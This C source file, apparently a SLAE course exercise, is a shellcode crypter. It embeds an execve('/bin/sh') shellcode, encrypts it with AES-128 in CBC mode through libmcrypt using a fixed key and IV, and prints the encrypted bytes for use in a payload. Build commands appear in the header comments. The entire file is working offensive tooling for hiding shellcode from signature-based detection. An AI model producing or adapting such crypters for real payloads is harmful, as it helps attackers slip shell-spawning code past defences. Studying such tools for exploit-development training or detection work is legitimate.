// apt-get install libmcrypt-dev
// gcc -o crypter crypter.c -lmcrypt

#include <stdio.h>
#include <string.h>
#include <mcrypt.h>

int main()
{
    // execve-stack shellcode
    char plain_text[] = "\x31\xc0\x50\x50\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\x64\x24\x0c\x89\xe3\x8d\x4c\x24\x0c\x8b\x54\x24\x10\xb0\x0b\xcd\x80";
    char initialization_vector[] = "SLAE1261SLAE1261";
    char password[] = "securitytubetube";
    int password_length = 16;
    int p_text_length = strlen(plain_text);

    MCRYPT algorithm = mcrypt_module_open("rijndael-128", NULL, "cbc", NULL);
    mcrypt_generic_init(algorithm, password, password_length, initialization_vector);
    mcrypt_generic(algorithm, plain_text, p_text_length);
    mcrypt_generic_deinit(algorithm);
    mcrypt_module_close(algorithm);
    
    int i;
    printf("Length: %d\n", p_text_length);
    for (i = 0; i < p_text_length; i++) 
    { 
        printf("\\x%02X", (unsigned char)plain_text[i]);
    }
    printf("\n");
    return 0;
}

